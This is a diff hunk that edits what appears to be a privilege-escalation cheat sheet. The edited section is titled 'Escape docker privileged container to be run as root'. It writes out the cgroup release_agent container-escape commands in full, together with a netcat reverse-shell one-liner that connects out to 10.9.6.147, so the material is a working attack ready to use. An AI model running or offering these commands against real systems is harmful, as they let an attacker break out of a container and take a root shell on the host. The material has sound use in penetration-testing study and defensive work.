@@ -147,14 +147,19 @@ jessie:$SALT$:1000:1000:jessie,,,:/home/jessie:/bin/bash
 ### Escape docker privileged container to be run as root
 
 ```bash
-mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x
-echo 1 > /tmp/cgrp/x/notify_on_release
+# Create new cgroup and namespace
+unshare -UrmC bash
+```
+
+```bash
+mount -t cgroup -o rdma cgroup /mnt
+echo 1 > /mnt/notify_on_release
 host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
-echo "$host_path/cmd" > /tmp/cgrp/release_agent
+echo "$host_path/cmd" > /mnt/release_agent
 echo '#!/bin/sh' > /cmd
-echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.9.6.147 4244 >/tmp/f" >> /cmd
+echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.9.6.147 4242 >/tmp/f" >> /cmd
 chmod a+x /cmd
-sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
+sh -c "echo \$\$ > /mnt/cgroup.procs"
 ```
 
 ### **LD\_PRELOAD**
